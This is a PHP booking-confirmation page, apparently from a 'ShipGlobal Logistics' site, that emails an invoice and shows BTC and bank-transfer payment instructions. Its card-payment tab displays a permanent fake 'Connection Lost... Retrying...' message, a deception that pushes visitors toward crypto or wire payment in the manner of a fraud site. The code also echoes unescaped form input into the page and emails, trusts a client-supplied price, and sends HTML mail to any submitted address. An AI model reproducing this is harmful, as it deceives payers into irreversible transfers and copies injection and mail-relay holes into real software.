<?php 
   session_start();
    ob_start();
    include('header.php');
    include('admin/db_connect.php');

	$query = $conn->query("SELECT * FROM system_settings limit 1")->fetch_array();
	foreach ($query as $key => $value) {
		if(!is_numeric($key))
			$_SESSION['setting_'.$key] = $value;
	}
    ob_end_flush();
    
$email      = $_POST['email'];  
$name       = $_POST['name'];
$contact    = $_POST['contact'];
$address  = $_POST['address'];
$logo =  $_POST['logo'];
$depart = $_POST['depart'];
$arrival = $_POST['arrival'];
$airlines = $_POST['airlines'];
$dpt = $_POST['dpt'];
$avt = $_POST['avt'];
$price = $_POST['price'];
$btc = $_SESSION['setting_contact'];
$qr = $_SESSION['setting_cover_img'];
$bank = $_SESSION['setting_about_content'];


$message = "<html><body> 	<img src='https://shipglobalplc.com/images/logo.png' align='center' width='150px' alt='ShipGlobal Logo' />	<section class='page-section' id='flight' >
        <div class='container'>
        	<div class='card'>
        		<div class='card-body'>
        			<div class='col-lg-12'>
						<div class='row'>
							<div class='col-md-12 text-center'>
								<h2><b>Flight Booking Module</b></h2>  
						<hr class='divider'>	<p>Name: $name</p>
						<p>Email:  $email </p>
						<p>Phone:  $contact </p>
						<p>Address:  $address  </p>
							</div>
						</div>
						<hr class='divider'>
			 
				<div class='row align-items-center'>
					<div class='col-md-3'>
						<img src='https://shipglobalplc.com/book/assets/img/$logo' alt=''>
					</div>
					<div class='col-md-6'>
						 <p><b> $depart - $arrival</b></p>
						 <p> Airline: <b> $airlines </b> </p>
						 <p> Departure: <b> $dpt </b> </p>
						 <p> Arrival: <b>$avt </b> </p>
					 
					</div>
					<div class='col-md-3 text-center align-self-end-sm'>
						<h4 class='text-right'><b>Payment Amount: $price </b></h4>
					 
					</div>
				</div> 
				<h4> Payment Methods </h4>
				<ul><li><b>BTC Payments Instruction</b> <br><img src='https://shipglobalplc.com/book/assets/img/$qr' alt='QR Code' width='100px'>
				<p> Send $price to $btc or  scan the QR code to make payment</p></li>
				
			 <li><b>Bank / Wire Payments Instruction</b> <br>
			 $bank
						</li>
					</ul>	
						<hr class='divider'>";
						 
						
						 $sub = "ShipGlobal Logistics, New Flight Booking. ";
                
                $header  = 'MIME-Version: 1.0' . "\r\n";
$header .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$header .= 'From: ShipGlobal Logistics <info@shipglobalplc.com>' . "\r\n";
mail($email,$sub,$message,$header);
  
?>
    <!DOCTYPE html>
<html lang="en">
<head>
     
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Edit Tracking</title>
        <link rel="icon" href="../assets/img/logo/favicon.png" type="image/x-icon"/>
        
    </head>
    <body>
	<section class="page-section" id="flight" >
        <div class="container">
        	<div class="card">
        		<div class="card-body">
        			<div class="col-lg-12">
						<div class="row">
							<div class="col-md-12 text-center">
								<h2><b><?php echo isset($trip) && $trip == 2 ? "Departure Searched Flight results..." : ( !isset($trip)? " Your Booking Details" :"Searched Flight results...")  ?></b></h2><br> 
						<p>Name: <?php echo $name ?></p>
						<p>Email: <?php echo $email ?> </p>
						<p>Phone: <?php echo $contact ?></p>
						<p>Address: <?php echo $address ?> </p>
							</div>
						</div>
						<hr class="divider">
			 
				<div class="row align-items-center">
					 
					<div class="col-md-6">
						 <p><b><?php echo $depart.' - '.$arrival ?></b></p>
						 <p><small>Airline: <b><?php echo $airlines ?></b></small></p>
						 <p><small>Departure: <b><?php echo date('h:i A',strtotime($dpt)) ?></b></small></p>
						 <p><small>Arrival: <b><?php echo (date('M d,Y',strtotime($dpt)) == date('M d,Y',strtotime($avt))) ? date('h:i A',strtotime($avt)) : date('M d,Y h:i A',strtotime($avt)) ?></b></small></p>
					 
					</div>
					<div class='col-md-3 text-center align-self-end-sm'>
						<h4 class='text-right'><b><?php echo $price ?></b></h4>
					 
					</div>
				</div>
				<br>	<div class="col-md-12 text-center"><br>
				<h3>Select Payment Method</h3><hr class="divider"> </div>
				
				<div class="season_tabs">
    
   <div class="season_tab">
       <input type="radio" id="tab-1" name="tab-group-1" checked>
       <label for="tab-1">BTC Payment</label>
       
       <div class="season_content">
           <span><h5 style="color:red;"> Send <b><?php echo $price ?></b> to <?php echo $_SESSION['setting_name']; ?> Wallet Address:  </h5>
        
       <input type="text" value=" <?php echo $_SESSION['setting_contact']; ?>" id="myInput">
<button onclick="myFunction4()" class="btn btn-success">Copy Address</button>
&nbsp;&nbsp;&nbsp;&nbsp;
<script>
function myFunction4() {
  var copyText = document.getElementById("myInput");
  copyText.select();
  copyText.setSelectionRange(0, 99999)
  document.execCommand("copy");
  alert("Copied the BTC Address: " + copyText.value);
}
</script><img src="assets/img/<?php echo $_SESSION['setting_cover_img'] ?>" alt="" width='100' height='100'> <br>

After BTC payments, kindly mail receipts to <a href="mailto:<?php echo $_SESSION['setting_email']; ?>"><?php echo $_SESSION['setting_email']; ?></a> for confirmation.
           
           </span>
       </div> 
   </div>
    
   <div class="season_tab">
       <input type="radio" id="tab-2" name="tab-group-1">
       <label for="tab-2">Bank / Wire Transfer</label>
       
       <div class="season_content">
           <span> <?php echo html_entity_decode($_SESSION['setting_about_content']) ?></span>
       </div> 
   </div>
   
   <div class="season_tab">
       <input type="radio" id="tab-3" name="tab-group-1">
       <label for="tab-3">Debit/Credit Card</label>
       
       <div class="season_content">
           <span> <img src="assets/img/card.png" height="20"><br><br>Checking secure  connection<br> Connection Lost...</span>
         <br> <br>  <img src="assets/img/1651618560_ajax-loader.gif"><br><br>  Retrying...
       </div> 
   </div>
    
    
</div>
	<span class='noprint' style="font-size: 11pt;"><span style="color: #008a17; font-family: georgia, serif; line-height: normal;">​&nbsp;</span><span style="color: #008a17; font-family: webdings; line-height: normal;">P&nbsp;</span><span style="color: #008a17; font-family: verdana, sans-serif; line-height: normal;">Before printing, think about the environment.</span></span>		 <br>
<p class='noprint'><i><small>Ensure to print this page if you wish to pay later. A copy of this invoice has been sent to your email already.</small></i></p><br>
		<a onclick="window.print()" class='noprint'><h4 class='btn btn-info' ><b>PRINT </b></h4>	 </a> &nbsp; <a href="../index.php" class='noprint'><h4 class='btn btn-danger' ><b>EXIT TO HOMEPAGE </b></h4>	 </a>
				 
				</div>
				</div>
        	</div> 
        </div>
    </section>
    
    <style>
    @media print{
   .noprint{
       display:none;
   }
}
    	#flight img{
    		max-height: 300px;
    		max-width: 200px; 
    	}
    	#flight p{
    		margin: unset
      	}
      	* {box-sizing: border-box}

.season_tabs {
  position: relative;   
  min-height: 250px; /* This part sucks */
  clear: both;
  margin: 25px 0;
}
.season_tab {
  float: left;  
  clear: both;
  width: 286px;
}
.season_tab label {
    background: #eee;
    padding: 10px;
    border: 1px solid #ccc;
    margin-left: -1px;
    font-size: 16px;
    vertical-align: middle;
    position: relative;
    left: 1px;
    width: 150px;
    height: 68px;
    display: table-cell;
}
.season_tab [type=radio] {
  display: none;   
}
.season_content {
  position: absolute;
  top: 0;
  left: 150px;
  background: white;
  right: 0;
  bottom: 0;
  padding: 20px;
  border: 1px solid #ccc;
 }
.season_content span {
  animation: 0.5s ease-out 0s 1 slideInFromTop; 
}
[type=radio]:checked ~ label {
  background: white;
  border-bottom: 2px solid #8bc34a;
  z-index: 2;
}
[type=radio]:checked ~ label ~ .season_content {
  z-index: 1;
}
    </style>
     
    <?php
 
   if($_POST) {
      
    $mail = $_SESSION['setting_email'];
    - $name     = "";
     - $email    = "";
    - $contact            = "";
   - $depart   	= "";
   - $arrival       	= "";
    - $airlines    		= "";
     - $price   		= "";
      
     
     
    
     
    if(isset($_POST['name'])) {
        $name = filter_var($_POST['name'], FILTER_SANITIZE_STRING);
    }
    
   
     
    if(isset($_POST['email'])) {
        $email = str_replace(array("\r", "\n", "%0a", "%0d"), '', $_POST['email']);
        $email = filter_var($email, FILTER_VALIDATE_EMAIL);
         
    }
     
   if(isset($_POST['contact'])) {
        $contact = filter_var($_POST['contact'], FILTER_SANITIZE_STRING);
    }
     
    if(isset($_POST['depart'])) {
        $depart = filter_var($_POST['depart'], FILTER_SANITIZE_STRING);
    }
 
  if(isset($_POST['arrival'])) {
        $arrival = filter_var($_POST['arrival'], FILTER_SANITIZE_STRING);
    }
    
    if(isset($_POST['airlines'])) {
        $airlines = filter_var($_POST['airlines'], FILTER_SANITIZE_STRING);
    }
    
    if(isset($_POST['price'])) {
        $price = filter_var($_POST['price'], FILTER_SANITIZE_STRING);
    }
    
    
    
    $recipient = "$mail";
     
    $headers  = 'MIME-Version: 1.0' . "\r\n"
    .'Content-type: text/html; charset=utf-8' . "\r\n"
    .'From: ' . $email . "\r\n";
 
    $email_content = "<html><body>";
    $email_content .= "<table style='font-family: Arial;'><tbody> <tr><td style='background: #eee; padding: 10px;'>Route</td><td style='background: #fda; padding: 10px;'>$depart - $arrival </td></tr>";
     
     $email_content .= "<tr><td style='background: #eee; padding: 10px;'>User</td><td style='background: #fda; padding: 10px;'>$name ($email)</td></tr>";
      $email_content .= "<tr><td style='background: #eee; padding: 10px;'>Carrier </td><td style='background: #fda; padding: 10px;'>$airlines</td></tr>";
      
       
        $email_content .= "<tr><td style='background: #eee; padding: 10px;'>Price</td><td style='background: #fda; padding: 10px;'>$price  </td></tr>";
    
       
          
        
    $email_content .= '</body></html>';
 
    
     
    if(mail($recipient, "Ongoing flight booking by Client ", $email_content, $headers)) {
        echo '<p> </p>';
    } else {
        echo '<p>  </p>';
    }
     
} else {
    echo '<p> </p>';
}
 
?>
 <script>
    if ( window.history.replaceState ) {
        window.history.replaceState( null, null, window.location.href );
    }
</script>
 
  </body></html>